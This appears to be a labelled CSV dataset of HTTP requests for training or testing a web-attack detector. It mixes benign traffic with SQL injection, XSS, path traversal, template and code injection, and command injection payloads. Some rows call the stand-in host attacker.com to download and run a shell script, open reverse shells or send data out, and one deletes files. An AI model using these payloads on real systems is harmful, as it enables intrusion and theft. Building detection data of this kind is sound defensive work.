request_normalized,label
"GET /news/article/top-10-tips HTTP/1.1
Host: news.example.com
Accept: text/html",benign
"GET /assets?path=..\..\..\windows\win.ini HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",path_traversal
"GET /template?expr=${7*7} HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",rce
"POST /profile?bio=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 56

input=""><script>alert(document.cookie)</script>&submit=1",xss
"GET /download?file=....\....\....\windows\system32\drivers\etc\hosts HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",path_traversal
"GET /api/products?category=tablet&page=2&sort=price HTTP/1.1
Host: shop.example.com
User-Agent: Mozilla/5.0
Accept: application/json",benign
"POST /eval?code=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 52

input=<% Runtime.getRuntime().exec('id') %>&submit=1",rce
"POST /api/users/6199/update HTTP/1.1
Host: api.example.com
Content-Type: application/json

{""name"":""bob_jones"",""email"":""user@example.com""}",benign
"GET /products?filter=' OR '1'='1 HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",sqli
"POST /api/process?data=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

input={{7*7}}&submit=1",rce
"GET /news/article/top-10-tips HTTP/1.1
Host: news.example.com
Accept: text/html",benign
"GET /comment?text=<SCRIPT SRC=http://evil.com/xss.js></SCRIPT> HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",xss
"POST /api/items?name=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 32

input=1' AND SLEEP(5)--&submit=1",sqli
"POST /api/process?data=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 62

input=${T(java.lang.Runtime).getRuntime().exec('id')}&submit=1",rce
"GET /search?q=' OR 1=1 LIMIT 1-- HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",sqli
"POST /products?filter=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 58

input=1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)--&submit=1",sqli
"POST /template?expr=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 62

input={{lipsum.__globals__['os'].popen('id').read()}}&submit=1",rce
"POST /api/items?name=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 23

input=admin'--&submit=1",sqli
"POST /contact HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

name=alice_miller&email=info@site.net&message=Hello World",benign
"GET /view?doc=..\..\..\windows\win.ini HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",path_traversal
"POST /api/login HTTP/1.1
Host: example.com
Content-Type: application/json
Content-Length: 42

{""username"":""alice_miller"",""password"":""830496d9""}",benign
"GET /image?src=../../../etc/passwd HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",path_traversal
"GET /comment?text=<svg onload=alert(1)> HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",xss
"POST /api/items?name=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 23

input=admin'--&submit=1",sqli
"POST /api/ping?host=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 110

input=; wget http://attacker.com/shell.sh -O /tmp/shell.sh && chmod x /tmp/shell.sh && /tmp/shell.sh&submit=1",cmdi
"GET /news/article/hello-world HTTP/1.1
Host: news.example.com
Accept: text/html",benign
"POST /exec?cmd=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 38

input=| nslookup attacker.com&submit=1",cmdi
"POST /view?doc=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 39

input=..\..\..\windows\win.ini&submit=1",path_traversal
"GET /feedback?msg=""><script>alert(document.cookie)</script> HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",xss
"GET /comment?text=<iframe src='javascript:alert(1)'></iframe> HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",xss
"POST /assets?path=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 29

input=/etc/passwd&submit=1",path_traversal
"GET /api/products?category=phone&page=47&sort=price HTTP/1.1
Host: shop.example.com
User-Agent: Mozilla/5.0
Accept: application/json",benign
"POST /feedback?msg=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 41

input=<body onload=alert('XSS')>&submit=1",xss
"GET /admin/run?input=; rm -rf /tmp/* HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",cmdi
"POST /image?src=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 47

input=..\..\..\windows\win.ini&submit=1",path_traversal
"POST /user?id=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 26

input=' OR '1'='1&submit=1",sqli
"GET /view?doc=../../boot.ini HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",path_traversal
"GET /image?src=../../etc/passwd HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",path_traversal
"GET /profile?bio=<script>alert('XSS')</script> HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",xss
"POST /user?id=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

input=1' OR 1=1--&submit=1",sqli
"POST /feedback?msg=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 59

input=<SCRIPT SRC=http://evil.com/xss.js></SCRIPT>&submit=1",xss
"POST /exec?cmd=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 50

input=| nc attacker.com 4444 -e /bin/bash&submit=1",cmdi
"GET /user?id=1 UNION SELECT user(),database(),version()-- HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",sqli
"GET /api/process?data=exec('import os; os.system(""calc.exe"")') HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",rce
"POST /exec?cmd=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 25

input=& ipconfig&submit=1",cmdi
"POST /tools/lookup?domain=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 51

input=| curl http://attacker.com/$(whoami)&submit=1",cmdi
"POST /image?src=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 39

input=..\..\..\windows\win.ini&submit=1",path_traversal
"POST /assets?path=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 34

input=../../../etc/passwd&submit=1",path_traversal
"POST /tools/lookup?domain=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 19

input=`id`&submit=1",cmdi
"GET /profile?bio='-alert(1)-' HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",xss
"POST /user?id=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 39

input=x' AND email IS NULL; --&submit=1",sqli
"GET /tools/lookup?domain=; ping -c 4 attacker.com HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",cmdi
"GET /search?q=clothing&lang=en HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
Cookie: session=00aa1df67fa3203b",benign
"GET /api/products?category=phone&page=47&sort=price HTTP/1.1
Host: shop.example.com
User-Agent: Mozilla/5.0
Accept: application/json",benign
"GET /search?q=<script>alert('XSS')</script> HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",xss
"POST /search?q=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 48

input=xss""><img src=/ onerror=alert(2)>&submit=1",xss
"GET /search?q=music&lang=en HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
Cookie: session=5a9cee7e65ab4e90",benign
"GET /calc?formula=system('id') HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",rce
"GET /exec?cmd=; rm -rf /tmp/* HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",cmdi
"GET /profile?bio=<script>alert('XSS')</script> HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",xss
"POST /comment?text=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 47

input=<img src=x onerror=alert('XSS')>&submit=1",xss
"GET /products?filter=1'; INSERT INTO users VALUES('hacker','hacked')-- HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",sqli
"POST /profile?bio=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 56

input=""><script>alert(document.cookie)</script>&submit=1",xss
"GET /api/process?data=eval(compile('import os; os.system(""id"")', 'string', 'exec')) HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",rce
"GET /template?expr=*{7*7} HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",rce
"GET /calc?formula=<?php passthru('cat /etc/passwd'); ?> HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",rce
"GET /api/categories HTTP/1.1
Host: example.com
Accept: application/json",benign
"POST /products?filter=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 64

input=1'; INSERT INTO users VALUES('hacker','hacked')--&submit=1",sqli
"POST /calc?formula=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 62

input=${T(java.lang.Runtime).getRuntime().exec('id')}&submit=1",rce
"GET /assets?path=..\..\..\windows\win.ini HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",path_traversal
"POST /search?q=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 58

input=1 UNION SELECT null,password FROM users--&submit=1",sqli
"GET /comment?text=<input type=text value='' onfocus=alert(1) autofocus> HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",xss
"GET /exec?cmd=; python3 -c 'import socket;s=socket.socket();s.connect((""attacker.com"",4444));import os;os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.system(""/bin/sh"")' HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",cmdi
"GET /search?q=<script>alert('XSS')</script> HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",xss
"POST /calc?formula=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 81

input={{config.__class__.__init__.__globals__['os'].popen('id').read()}}&submit=1",rce
"GET /api/process?data=`php -r 'system(""id"");'` HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",rce
"GET /api/products?category=tablet&page=28&sort=price HTTP/1.1
Host: shop.example.com
User-Agent: Mozilla/5.0
Accept: application/json",benign
"POST /api/login HTTP/1.1
Host: example.com
Content-Type: application/json
Content-Length: 42

{""username"":""alice_miller"",""password"":""937e382a""}",benign
"GET /api/process?data={{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}} HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",rce
"GET /api/products?category=camera&page=7&sort=price HTTP/1.1
Host: shop.example.com
User-Agent: Mozilla/5.0
Accept: application/json",benign
"GET /view?doc=../etc/passwd.jpg HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",path_traversal
"GET /download?file=../../../../etc/shadow HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",path_traversal
"GET /api/process?data=system('id') HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",rce
"GET /calc?formula=eval(compile('import os; os.system(""id"")', 'string', 'exec')) HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",rce
"POST /api/login HTTP/1.1
Host: example.com
Content-Type: application/json
Content-Length: 42

{""username"":""jane_smith"",""password"":""5bc9b66a""}",benign
"POST /user?id=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 58

input=1 UNION SELECT null,password FROM users--&submit=1",sqli
"GET /template?expr=`php -r 'system(""id"");'` HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",rce
"POST /products?filter=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 58

input=1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)--&submit=1",sqli
"GET /tools/lookup?domain=| nslookup attacker.com HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",cmdi
"GET /search?q=shoes&lang=en HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
Cookie: session=b95c8e356bae8803",benign
"GET /tools/lookup?domain=$(id) HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",cmdi
"POST /view?doc=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 37

input=../../../../etc/shadow&submit=1",path_traversal
"GET /images/img_8381.jpg HTTP/1.1
Host: cdn.example.com
Referer: https://example.com/",benign
"GET /assets?path=..\..\..\windows\win.ini HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",path_traversal
"POST /assets?path=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 45

input=../../etc/passwd&submit=1",path_traversal
"POST /user?id=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 33

input=' OR 1=1 LIMIT 1--&submit=1",sqli
"GET /search?q=shoes&lang=en HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
Cookie: session=6ae9330ceac4e1b1",benign
"POST /feedback?msg=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 59

input=<SCRIPT SRC=http://evil.com/xss.js></SCRIPT>&submit=1",xss
"GET /comment?text=';alert(String.fromCharCode(88,83,83))// HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",xss
